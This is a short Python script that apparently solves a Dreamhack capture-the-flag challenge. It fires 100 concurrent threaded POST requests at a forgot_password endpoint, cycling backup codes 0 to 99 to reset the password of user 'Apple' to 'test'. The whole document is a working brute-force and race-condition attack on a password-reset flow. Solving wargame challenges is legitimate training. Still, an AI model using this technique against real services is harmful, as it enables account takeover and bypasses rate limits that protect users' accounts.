import requests

import threading

url = 'http://host1.dreamhack.games:16900/forgot_password'

for i in range(100):

    params = {'userid': 'Apple', 'newpassword':'test', 'backupCode':i}

    print(params)

    th = threading.Thread(target=requests.post, args=(url, params))

    th.start()